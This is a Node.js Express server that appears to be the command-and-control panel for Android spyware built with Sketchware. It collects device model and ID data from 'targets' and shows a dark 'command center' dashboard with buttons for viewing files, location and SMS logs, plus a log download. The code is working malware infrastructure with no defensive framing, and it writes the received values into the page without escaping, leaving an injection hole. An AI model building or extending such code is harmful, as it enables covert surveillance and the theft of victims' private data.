const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());

const DATA_FILE = '/tmp/targets.json';

const readData = () => {
    if (!fs.existsSync(DATA_FILE)) return [];
    try {
        let data = JSON.parse(fs.readFileSync(DATA_FILE));
        const now = Date.now();
        const oneDay = 24 * 60 * 60 * 1000;
        return data.filter(t => (now - new Date(t.timestamp).getTime()) < oneDay);
    } catch (e) { return []; }
};

const saveData = (data) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
};

// API to receive data from Sketchware
app.post('/api', (req, res) => {
    const { model, id } = req.body;
    let targets = readData();
    targets.push({ 
        model, 
        id, 
        timestamp: new Date().toISOString(),
        lastSeen: new Date().toLocaleString() 
    });
    saveData(targets);
    res.json({ status: "success", data: { model, id } });
});

// Main Dashboard UI with Buttons
app.get('/', (req, res) => {
    const targets = readData();
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>NEXUS PRO - COMMAND CENTER</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background:#0f0f0f; color:#e0e0e0; font-family: sans-serif; padding:10px; }
                .card { background:#1a1a1a; border:1px solid #333; border-radius:12px; padding:15px; margin-bottom:15px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
                .status-btn { background:#00e676; color:black; border:none; padding:8px 15px; border-radius:5px; font-weight:bold; cursor:pointer; margin:5px; text-decoration:none; display:inline-block; }
                .action-btn { background:#2196F3; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer; margin:5px; text-decoration:none; display:inline-block; font-size:12px; }
                .header { color:#00e676; text-align:center; border-bottom: 2px solid #333; padding-bottom:10px; }
            </style>
        </head>
        <body>
            <h1 class="header">NEXUS PRO v2.0</h1>
            <p style="text-align:center;">Targets Active: <b>${targets.length}</b></p>
            
            <div style="text-align:center;">
                <a href="/download" class="status-btn">DOWNLOAD FULL LOGS</a>
            </div>

            <h3 style="margin-top:20px;">Connected Devices:</h3>
            ${targets.length === 0 ? '<p style="color:#666;">Waiting for connection...</p>' : ''}
            
            ${targets.reverse().map(t => `
                <div class="card">
                    <div style="display:flex; justify-content:space-between;">
                        <b>📱 ${t.model}</b>
                        <small style="color:#00e676;">Online</small>
                    </div>
                    <code style="display:block; margin:10px 0; color:#888;">ID: ${t.id}</code>
                    <hr style="border:0.1px solid #333;">
                    <div style="margin-top:10px;">
                        <a href="#" class="action-btn">📂 VIEW FILES</a>
                        <a href="#" class="action-btn" style="background:#f44336;">📍 LOCATION</a>
                        <a href="#" class="action-btn" style="background:#FF9800;">💬 SMS LOGS</a>
                    </div>
                    <small style="display:block; margin-top:10px; color:#555;">Last Activity: ${t.lastSeen}</small>
                </div>
            `).join('')}
        </body>
        </html>
    `);
});

module.exports = app;
            
